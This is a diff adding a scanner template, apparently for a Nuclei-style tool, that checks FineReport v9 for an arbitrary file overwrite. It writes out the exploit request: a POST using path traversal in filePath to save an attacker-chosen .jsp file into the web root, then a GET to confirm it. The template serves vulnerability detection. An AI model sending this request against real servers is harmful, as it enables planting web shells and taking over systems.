@@ -1,0 +1,31 @@
+id: fine-report-v9-file-upload
+brief:
+    title: FineReport v9 Arbitrary File Overwrite
+    by: SleepingBag945
+    level: critical
+    about: FineReport ( A business intelligence (BI) and reporting software ) is vulnerable to Arbitrary File Overwrite.
+    label:
+        - finereport
+        - fileupload
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/{{filename}}.jsp'
+      head:
+        Content-Type: text/xml;charset=UTF-8
+      body: '{"__CONTENT__":"{{string}}","__CHARSET__":"UTF-8"}'
+      signs:
+        - "on": word
+          has:
+            - '{{string}}'
+          in: body_2
+    - verb: GET
+      to:
+        - '{{BaseURL}}/WebReport/{{filename}}.jsp'
+      signs:
+        - "on": word
+          has:
+            - '{{string}}'
+          in: body_2
